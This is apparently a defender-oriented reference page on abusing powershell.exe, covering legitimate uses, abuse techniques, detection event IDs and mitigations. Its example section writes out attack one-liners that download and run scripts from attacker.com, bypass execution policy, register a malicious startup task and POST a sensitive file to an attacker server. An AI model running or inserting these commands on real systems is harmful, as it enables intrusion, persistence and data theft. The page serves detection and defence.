# powershell.exe
## What is it?
*```powershell.exe``` is a Windows command-line shell and scripting language designed for system administration, automation, and configuration management.*
*It allows users to run scripts, execute commands, and manage system settings by providing access to the .NET framework and Windows Management Instrumentation (WMI).*
*PowerShell is widely used for legitimate administrative tasks but can also be misused for malicious purposes due to its powerful capabilities.*

## Legitimate Usage
- **System Administration** → Automate administrative tasks such as user management, system configuration, and software installation.
- **Task Automation** → Run scripts to automate repetitive tasks, such as system updates or report generation.
- **Configuration Management** → Administer and configure servers, applications, and other resources across a network.
- **Remote Management** → Use PowerShell Remoting to manage multiple systems remotely (via `Invoke-Command`, `Enter-PSSession`).

## How to abuse it
- **Execution of Malicious Scripts** → Attackers can use ```powershell.exe``` to run malicious scripts, including PowerShell-based payloads and exploits.
- **Bypassing Execution Policies** → PowerShell’s script execution policies can be bypassed (e.g., using `-ExecutionPolicy Bypass`) to run unsigned scripts on a system.
- **Privilege Escalation** → PowerShell can be used to escalate privileges by executing malicious code or exploiting vulnerabilities in the system.
- **Persistence Mechanism** → Attackers can use PowerShell scripts to maintain persistence by creating scheduled tasks or modifying startup entries.
- **Data Exfiltration** → PowerShell can be used to send stolen data over the network via HTTP, HTTPS, or SMB.

## Example attacks
### 1. Downloading and Executing a Malicious Payload
*Attackers can use ```powershell.exe``` to download and execute malicious payloads from a remote server.*
**Download and Execute PowerShell Script**

```
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://attacker.com/payload.ps1 -OutFile C:\temp\payload.ps1; C:\temp\payload.ps1"
```

**Effect:**
- Downloads the malicious PowerShell script from a remote server.
- Executes the script locally, potentially allowing the attacker to run commands or install malware.

### 2. Bypassing Execution Policies
*PowerShell’s execution policies can be bypassed using the `-ExecutionPolicy Bypass` flag to run unsigned scripts.*
**Bypass Execution Policy**

```
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://attacker.com/malicious.ps1 -OutFile C:\malicious.ps1; C:\malicious.ps1"
```

**Effect:**
- Allows the execution of unsigned PowerShell scripts, which would normally be blocked by default execution policies.

### 3. Persistence via Scheduled Task
*Attackers can create a scheduled task using PowerShell to run malicious scripts on a regular basis, ensuring persistence.*
**Create Scheduled Task for PowerShell Script Execution**

```
powershell.exe -Command "New-ScheduledTaskTrigger -AtStartup | New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File C:\malicious.ps1' | Register-ScheduledTask -TaskName 'MaliciousTask'"
```

**Effect:**
- The task runs at system startup, ensuring the malicious script is executed every time the machine reboots.

### 4. Lateral Movement via PowerShell Remoting
*PowerShell Remoting allows attackers to run commands on remote systems and move laterally across the network.*
**Execute PowerShell Remotely on a Target System**

```
powershell.exe -Command "Enter-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)"
```

**Effect:**
- Establishes a remote session on the target system to execute commands, exfiltrate data, or deploy malware.

### 5. Data Exfiltration Using PowerShell
*Attackers can use PowerShell to exfiltrate stolen data to a remote server.*
**Send Data to an Attacker-Controlled Server**

```
powershell.exe -Command "Invoke-WebRequest -Uri http://attacker.com/exfiltrate -Method POST -Body (Get-Content C:\SensitiveData.txt -Raw)"
```

**Effect:**
- Steals data from the system and sends it to a remote server controlled by the attacker.

# Detection & Mitigation
## Detection Methods
**Monitor PowerShell Execution**
- **Event ID 4688 (Process Creation)** → Detect when ```powershell.exe``` is executed, especially with suspicious arguments like `-ExecutionPolicy Bypass` or from unusual paths.
- **Monitor PowerShell Remoting** → Track usage of commands such as `Enter-PSSession` or `Invoke-Command`, which can be used for lateral movement.

**Analyze PowerShell Logs**
- **PowerShell Script Block Logging** → Enable PowerShell script block logging to capture the execution of potentially malicious scripts.
- **Event ID 4104 (PowerShell Script Execution)** → Monitor for PowerShell script execution that may not align with standard user behavior.

**Monitor Network Traffic**
- **Look for Unusual Network Connections** → Detect outbound connections to suspicious IP addresses, especially when PowerShell is used to exfiltrate data.

## Mitigation Strategies
- **Restrict PowerShell Access** → Use Group Policy to restrict access to PowerShell or block PowerShell execution altogether.
- **Use Application Whitelisting** → Implement application whitelisting tools like AppLocker or Device Guard to prevent unauthorized PowerShell scripts from running.
- **Implement Endpoint Protection** → Use endpoint protection tools to detect malicious PowerShell activity, such as known attack scripts or abnormal command usage.
- **PowerShell Constrained Language Mode** → Enable Constrained Language Mode to limit the capabilities of PowerShell on devices where it’s necessary.
- **Network Traffic Filtering** → Implement network traffic filtering to prevent unauthorized connections initiated by PowerShell scripts.
